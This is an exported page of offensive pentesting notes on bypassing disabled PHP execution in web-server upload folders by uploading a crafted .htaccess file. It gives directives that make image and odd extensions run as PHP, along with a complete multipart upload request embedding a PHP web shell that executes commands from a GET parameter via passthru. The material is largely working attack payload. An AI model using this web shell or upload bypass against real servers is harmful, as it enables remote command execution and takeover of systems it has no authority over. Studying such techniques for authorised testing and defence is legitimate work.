<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Execution disabled on the Web Server</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Execution disabled on the Web Server</h1><br/><br />If we have the ability to upload files on the Web Server, we can try to re-enable execution of PHP file by:<br /><br />• put .htaccess in your upload folder <br />   ◇ with this(BETTER):<br />	<div class="codebox"><pre>AddType application<span style="color:#ff9d00;font-weight:700">/</span>x-httpd-php .php16      <span style="color:#0088ff;font-weight:400"># Say all file with extension .php16 will execute php</span></pre></div><br />	Note: this attack relies on the following <span style="text-decoration:underline;">options being enabled on the Web Server</span> (NGINX does not support .htaccess files, Apache yes)<br />	<div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>apache2<span style="color:#ff9d00;font-weight:700">/</span>apache2.conf<span style="color:#ff9d00;font-weight:700">:</span>      AllowOverride Options<br /><span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/</span>apache2<span style="color:#ff9d00;font-weight:700">/</span>apache2.conf<span style="color:#ff9d00;font-weight:700">:</span>      AllowOverride FileInfo</pre></div><br />	source: <a href="https://thibaud-robin.fr/articles/bypass-filter-upload/">https://thibaud-robin.fr/articles/bypass-filter-upload/</a><br />   ◇ or  :<br />	<div class="codebox"><pre>&lt;IfModule mod_php5.c&gt;<br />  php_flag engine off<br />&lt;<span style="color:#ff9d00;font-weight:700">/</span>IfModule&gt;<br />&lt;IfModule mod_php7.c&gt;<br />  php_flag engine off<br />&lt;<span style="color:#ff9d00;font-weight:700">/</span>IfModule&gt;</pre></div><br />	source: <a href="https://www.drupal.org/project/drupal/issues/2820611">https://www.drupal.org/project/drupal/issues/2820611</a><br />   <br /><br /><strong><h3>HtShells</h3></strong><br /><a href="https://github.com/wireghoul/htshells">https://github.com/wireghoul/htshells</a><br /><br />Upload the file .htaccess and at the same time we will have a Web Shell( we could not ave access to the file .htaccess)<br /><div class="codebox"><pre>./prepare.sh shell/mod_php.shell.htaccess</pre></div><br /><br /><div class="codebox"><pre>Content-Disposition: form-data; name=&quot;fileToUpload&quot;; filename=&quot;.htaccess&quot;<br />Content-Type: application/octet-stream<br /><br />&lt;Files ~ &quot;^\.ht&quot;&gt;<br /># Require all granted<br />    Order allow,deny<br />    Allow from all<br />&lt;/Files&gt;<br />AddType application/x-httpd-php .php2 .php3 .phtml <br />AddType application/x-httpd-php .png .gif<br />AddType application/x-httpd-php .htaccess<br />AddHandler php5-script php<br />###### SHELL ###### &lt;?php echo &quot;--&gt;&lt;form method=&#39;get&#39;&gt;&lt;input type=&#39;text&#39; name=&#39;c&#39; value=&#39;&quot;.$_GET[&#39;c&#39;].&quot;&#39;&gt;&lt;input type=&#39;submit&#39; name=&#39;go&#39; value=&#39;Go!&#39;&gt;&lt;/form&gt;\n&lt;pre&gt;&quot;;passthru($_GET[&#39;c&#39;].&quot; 2&gt;&amp;1&quot;);echo &quot;&lt;/pre&gt;&quot;; ?&gt;</pre></div><br />	<a href=""><img src="images/1990-1.png" alt="images/1990-1.png" /></a><br />	<a href=""><img src="images/1990-2.png" alt="images/1990-2.png" /></a><br /><br /><strong>.htaccess</strong><br /><div class="codebox"><pre>AddType application/x-httpd-php .php .php2 .php3 .phtml .php5 .png .gif<br />AddHandler php5-script php</pre></div><br />With “AddHandler php5-script php”  When the php keyword appears in the file name, the contents of the file will be executed by the code</div>
</body>
</html>
